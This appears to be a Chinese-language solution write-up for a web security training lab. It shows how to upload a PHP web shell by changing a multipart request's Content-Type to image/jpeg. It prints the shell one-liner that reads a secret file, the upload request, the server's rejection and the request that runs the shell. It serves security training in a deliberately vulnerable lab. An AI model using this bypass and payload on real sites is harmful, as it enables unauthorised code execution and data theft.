# 实验：通过绕过 Content-Type 限制上传 Web Shell

本实验包含一个易受攻击的图片上传功能。它试图阻止用户上传非预期的文件类型，但依赖于检查用户可控的输入来进行验证。

为了解决本实验，请上传一个基本的 PHP Web Shell，并利用它窃取 `/home/carlos/secret` 文件的内容。使用实验室横幅中提供的按钮提交此秘密信息。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 在账户页面发现头像上传功能
- 将 php 代码放入 php 文件 `x.php` 中

    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
- 提交载荷文件
    ```http
    ------WebKitFormBoundaryjEaSBtgfy6wFvguj
    Content-Disposition: form-data; name="avatar"; filename="x.php"
    Content-Type: application/octet-stream

    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ------WebKitFormBoundaryjEaSBtgfy6wFvguj
    ```
    - 服务器响应
        ```log
        Sorry, file type application/octet-stream is not allowed
        Only image/jpeg and image/png are allowed
        Sorry, there was an error uploading your file.
        ```

- 修改文件 POST 体中的图片类型，再提交
    ```http
    Content-Type: image/jpeg
    ```
    - 成功上传

- 访问账户页面，自动请求头像
    ```http
    GET /files/avatars/x.php HTTP/2
    ```
    - 服务器响应读取到的文件数据
